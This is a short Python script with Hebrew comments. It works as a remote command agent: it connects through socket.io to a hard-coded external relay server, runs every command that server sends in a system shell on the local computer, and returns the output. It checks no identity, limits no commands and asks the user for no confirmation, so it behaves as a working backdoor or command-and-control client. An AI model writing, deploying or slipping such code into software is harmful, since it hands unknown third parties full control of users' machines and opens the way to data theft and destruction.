import socketio
import subprocess
import time
import sys

# הגדרת הלקוח לתקשורת בזמן אמת
sio = socketio.Client()

# הכתובת של השרת המתווך (נשתמש בשרת חינמי)
SERVER_URL = 'https://expert-bot-relay.onrender.com'

@sio.event
def connect():
    print("Successfully connected to the Global Control Hub.")

@sio.on('dispatch_command')
def on_command(data):
    """
    כאן מתבצע הביצוע המקצועי. הסוכן מקבל פקודה מהאתר ומריץ אותה
    על המחשב המקומי של המשתמש.
    """
    cmd = data.get('cmd')
    print(f"Executing System Task: {cmd}")
    
    try:
        # הרצה אמיתית ב-Windows/Linux/Mac
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout if result.returncode == 0 else result.stderr
        
        # מחזיר את התוצאה לאתר כדי שתוצג בטרמינל הירוק
        sio.emit('command_response', {'status': 'success', 'data': output})
    except Exception as e:
        sio.emit('command_response', {'status': 'error', 'data': str(e)})

if __name__ == '__main__':
    try:
        sio.connect(SERVER_URL)
        sio.wait()
    except Exception as e:
        print(f"Connection failed: {e}")
